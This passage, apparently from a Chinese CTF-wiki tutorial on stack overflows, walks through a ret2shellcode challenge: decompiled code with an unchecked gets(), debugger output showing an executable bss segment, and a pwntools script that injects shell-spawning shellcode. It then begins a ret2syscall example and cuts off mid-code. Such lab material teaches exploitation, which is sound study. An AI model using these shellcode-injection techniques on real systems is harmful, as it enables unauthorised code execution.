&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;hljs-comment&#34;&gt;// [sp+1Ch] [bp-64h]@1&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdout, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdin, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;No system for you this time !!!&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;gets&lt;/span&gt;((&lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; *)&amp;amp;v4);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;strncpy&lt;/span&gt;(buf2, (&lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; *)&amp;amp;v4, &lt;span class=&#34;hljs-number&#34;&gt;0x64&lt;/span&gt;u);&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;bye bye ~&#34;&lt;/span&gt;);&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;&lt;br&gt;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。&lt;/p&gt;
&lt;figure class=&#34;highlight arduino&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;.bss:&lt;span class=&#34;hljs-number&#34;&gt;0804&lt;/span&gt;A080                 &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; buf2&lt;br&gt;.bss:&lt;span class=&#34;hljs-number&#34;&gt;0804&lt;/span&gt;A080 ; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; buf2[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;]&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。&lt;/p&gt;
&lt;figure class=&#34;highlight gradle&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;gef➤  b main&lt;br&gt;Breakpoint &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; at &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8048536: &lt;span class=&#34;hljs-keyword&#34;&gt;file&lt;/span&gt; ret2shellcode.c, line &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;.&lt;br&gt;gef➤  r&lt;br&gt;Starting program: &lt;span class=&#34;hljs-regexp&#34;&gt;/mnt/&lt;/span&gt;hgfs&lt;span class=&#34;hljs-regexp&#34;&gt;/Hack/&lt;/span&gt;CTF-Learn&lt;span class=&#34;hljs-regexp&#34;&gt;/pwn/&lt;/span&gt;stack&lt;span class=&#34;hljs-regexp&#34;&gt;/example/&lt;/span&gt;ret2shellcode/ret2shellcode &lt;br&gt;&lt;br&gt;Breakpoint &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, main () at ret2shellcode.c:&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;       setvbuf(stdout, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;LL, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;LL);&lt;br&gt;─────────────────────────────────────────────────────────────────────[ &lt;span class=&#34;hljs-keyword&#34;&gt;source&lt;/span&gt;:ret2shellcode.c+&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; ]────&lt;br&gt;      &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; main(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;br&gt;      &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;  {&lt;br&gt; →    &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;      setvbuf(stdout, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;LL, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;LL);&lt;br&gt;      &lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;      setvbuf(stdin, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;LL, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;LL);&lt;br&gt;     &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;  &lt;br&gt;─────────────────────────────────────────────────────────────────────[ trace ]────&lt;br&gt;[#&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8048536 → Name: main()&lt;br&gt;─────────────────────────────────────────────────────────────────────────────────────────────────────&lt;br&gt;gef➤  vmmap &lt;br&gt;Start      End        Offset     Perm Path&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x08048000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x08049000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 r-x &lt;span class=&#34;hljs-regexp&#34;&gt;/mnt/&lt;/span&gt;hgfs&lt;span class=&#34;hljs-regexp&#34;&gt;/Hack/&lt;/span&gt;CTF-Learn&lt;span class=&#34;hljs-regexp&#34;&gt;/pwn/&lt;/span&gt;stack&lt;span class=&#34;hljs-regexp&#34;&gt;/example/&lt;/span&gt;ret2shellcode/ret2shellcode&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x08049000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x0804a000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 r-x &lt;span class=&#34;hljs-regexp&#34;&gt;/mnt/&lt;/span&gt;hgfs&lt;span class=&#34;hljs-regexp&#34;&gt;/Hack/&lt;/span&gt;CTF-Learn&lt;span class=&#34;hljs-regexp&#34;&gt;/pwn/&lt;/span&gt;stack&lt;span class=&#34;hljs-regexp&#34;&gt;/example/&lt;/span&gt;ret2shellcode/ret2shellcode&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x0804a000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x0804b000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00001000 rwx &lt;span class=&#34;hljs-regexp&#34;&gt;/mnt/&lt;/span&gt;hgfs&lt;span class=&#34;hljs-regexp&#34;&gt;/Hack/&lt;/span&gt;CTF-Learn&lt;span class=&#34;hljs-regexp&#34;&gt;/pwn/&lt;/span&gt;stack&lt;span class=&#34;hljs-regexp&#34;&gt;/example/&lt;/span&gt;ret2shellcode/ret2shellcode&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7dfc000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fab000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 r-x &lt;span class=&#34;hljs-regexp&#34;&gt;/lib/i&lt;/span&gt;386-linux-gnu/libc-&lt;span class=&#34;hljs-number&#34;&gt;2.23&lt;/span&gt;.so&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fab000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fac000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x001af000 --- &lt;span class=&#34;hljs-regexp&#34;&gt;/lib/i&lt;/span&gt;386-linux-gnu/libc-&lt;span class=&#34;hljs-number&#34;&gt;2.23&lt;/span&gt;.so&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fac000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fae000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x001af000 r-x &lt;span class=&#34;hljs-regexp&#34;&gt;/lib/i&lt;/span&gt;386-linux-gnu/libc-&lt;span class=&#34;hljs-number&#34;&gt;2.23&lt;/span&gt;.so&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fae000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7faf000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x001b1000 rwx &lt;span class=&#34;hljs-regexp&#34;&gt;/lib/i&lt;/span&gt;386-linux-gnu/libc-&lt;span class=&#34;hljs-number&#34;&gt;2.23&lt;/span&gt;.so&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7faf000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fb2000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 rwx &lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fd3000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fd5000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 rwx &lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fd5000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fd7000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 r-- [vvar]&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fd7000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fd9000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 r-x [vdso]&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7fd9000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7ffb000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 r-x &lt;span class=&#34;hljs-regexp&#34;&gt;/lib/i&lt;/span&gt;386-linux-gnu/ld-&lt;span class=&#34;hljs-number&#34;&gt;2.23&lt;/span&gt;.so&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7ffb000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7ffc000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 rwx &lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7ffc000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7ffd000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00022000 r-x &lt;span class=&#34;hljs-regexp&#34;&gt;/lib/i&lt;/span&gt;386-linux-gnu/ld-&lt;span class=&#34;hljs-number&#34;&gt;2.23&lt;/span&gt;.so&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7ffd000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xf7ffe000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00023000 rwx &lt;span class=&#34;hljs-regexp&#34;&gt;/lib/i&lt;/span&gt;386-linux-gnu/ld-&lt;span class=&#34;hljs-number&#34;&gt;2.23&lt;/span&gt;.so&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xfffdd000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xffffe000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00000000 rwx [stack]&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x0804a000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x0804b000 &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x00001000 rwx &lt;span class=&#34;hljs-regexp&#34;&gt;/mnt/&lt;/span&gt;hgfs&lt;span class=&#34;hljs-regexp&#34;&gt;/Hack/&lt;/span&gt;CTF-Learn&lt;span class=&#34;hljs-regexp&#34;&gt;/pwn/&lt;/span&gt;stack&lt;span class=&#34;hljs-regexp&#34;&gt;/example/&lt;/span&gt;ret2shellcode/ret2shellcode&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。&lt;/p&gt;
&lt;p&gt;具体的 payload 如下&lt;/p&gt;
&lt;figure class=&#34;highlight mipsasm&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mipsasm&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;br&gt;from pwn import *&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;sh &lt;/span&gt;= process(&lt;span class=&#34;hljs-string&#34;&gt;&#39;./ret2shellcode&#39;&lt;/span&gt;)&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;shellcode &lt;/span&gt;= asm(&lt;span class=&#34;hljs-keyword&#34;&gt;shellcraft.sh())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;buf2_addr &lt;/span&gt;= &lt;span class=&#34;hljs-number&#34;&gt;0x804a080&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;sh.sendline(shellcode.ljust(112, &lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&#39;A&#39;&lt;/span&gt;) + p32(&lt;span class=&#34;hljs-keyword&#34;&gt;buf2_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;题目-¶&#34;&gt;&lt;a href=&#34;#题目-¶&#34; class=&#34;headerlink&#34; title=&#34;题目 ¶&#34;&gt;&lt;/a&gt;题目 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_5&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;sniperoj-pwn100-shellcode-x86-64&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ret2syscall¶&#34;&gt;&lt;a href=&#34;#ret2syscall¶&#34; class=&#34;headerlink&#34; title=&#34;ret2syscall¶&#34;&gt;&lt;/a&gt;ret2syscall&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall&#34;&gt;¶&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶-2&#34;&gt;&lt;a href=&#34;#原理-¶-2&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_6&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;ret2syscall，即控制程序执行系统调用，获取 shell。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶-2&#34;&gt;&lt;a href=&#34;#例子-¶-2&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_7&#34;&gt;¶&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;这里我们以 bamboofox 中的 ret2syscall 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop&#34;&gt;ret2syscall&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先检测程序开启的保护&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-string&#34;&gt;➜&lt;/span&gt;  &lt;span class=&#34;hljs-string&#34;&gt;ret2syscall&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;checksec&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;rop&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Arch:&lt;/span&gt;     &lt;span class=&#34;hljs-string&#34;&gt;i386-32-little&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;RELRO:&lt;/span&gt;    &lt;span class=&#34;hljs-string&#34;&gt;Partial&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;RELRO&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;Stack:&lt;/span&gt;    &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;found&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;NX:&lt;/span&gt;       &lt;span class=&#34;hljs-string&#34;&gt;NX&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;enabled&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;PIE:&lt;/span&gt;      &lt;span class=&#34;hljs-literal&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;PIE&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;(0x8048000)&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码&lt;/p&gt;
&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;hljs-type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;hljs-type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;hljs-comment&#34;&gt;// [sp+1Ch] [bp-64h]@1&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;setvbuf&lt;/span&gt;(stdout, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span 